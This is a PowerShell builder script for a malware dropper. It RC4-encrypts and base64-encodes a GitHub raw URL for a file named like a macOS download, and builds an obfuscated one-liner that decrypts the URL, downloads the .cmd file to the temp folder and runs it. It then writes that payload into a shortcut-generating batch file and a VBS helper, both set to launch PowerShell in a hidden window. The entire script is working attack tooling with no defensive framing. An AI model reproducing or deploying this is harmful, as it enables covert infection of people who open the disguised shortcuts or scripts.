$url = "https://raw.githubusercontent.com/tiiisiet65-sudo/LoioioNoaisK/main/Download-macOSx.cmd"
$key = "X9kL2"
$kBytes = [System.Text.Encoding]::ASCII.GetBytes($key)
$cBytes = [System.Text.Encoding]::ASCII.GetBytes($url)

# RC4 encryption
$S = 0..255
$j = 0
for ($i=0; $i -lt 256; $i++) {
    $j = ($j + $S[$i] + $kBytes[$i % $kBytes.Length]) % 256
    $temp = $S[$i]; $S[$i] = $S[$j]; $S[$j] = $temp
}
$j = 0; $y = 0
$enc = foreach ($b in $cBytes) {
    $y = ($y + 1) % 256
    $j = ($j + $S[$y]) % 256
    $temp = $S[$y]; $S[$y] = $S[$j]; $S[$j] = $temp
    $b -bxor $S[($S[$y] + $S[$j]) % 256]
}
$cBase64 = [Convert]::ToBase64String($enc)

$payload = "`$c=[Convert]::FromBase64String('$cBase64');`$k=[Text.Encoding]::ASCII.GetBytes('$key');`$S=0..255;`$j=0;0..255|%{`$j=(`$j+`$S[`$_]+`$k[`$_%`$k.Length])%256;`$S[`$_],`$S[`$j]=`$S[`$j],`$S[`$_]};`$j=0;`$y=0;`$r=foreach(`$b in `$c){`$y=(`$y+1)%256;`$j=(`$j+`$S[`$y])%256;`$S[`$y],`$S[`$j]=`$S[`$j],`$S[`$y];`$b -bxor `$S[(`$S[`$y]+`$S[`$j])%256]};iwr([Text.Encoding]::ASCII.GetString(`$r)) -o `$env:TEMP\s.cmd;& `$env:TEMP\s.cmd"

Write-Host "Payload length: $($payload.Length)"

# Update Create-LNK-VBS.cmd
$f = "Create-LNK-VBS.cmd"
$content = Get-Content $f
for ($i=0; $i -lt $content.Length; $i++) {
    if ($content[$i] -match 'echo lnk.Arguments =') {
        $escaped = $payload -replace '%', '%%'
        $content[$i] = 'echo lnk.Arguments = "/c powershell -w hidden -Command `"' + $escaped + '`"" >> make_sc.vbs'
    }
}
$content | Set-Content $f

# Update sys_helper.vbs
$f = "Csharp-Version/sys_helper.vbs"
$content = Get-Content $f
for ($i=0; $i -lt $content.Length; $i++) {
    if ($content[$i] -match 'CreateObject\("WScript.Shell"\).Run') {
        $content[$i] = 'CreateObject("WScript.Shell").Run "powershell -w hidden -Command """' + $payload + '"""" , 0, False'
    }
}
$content | Set-Content $f
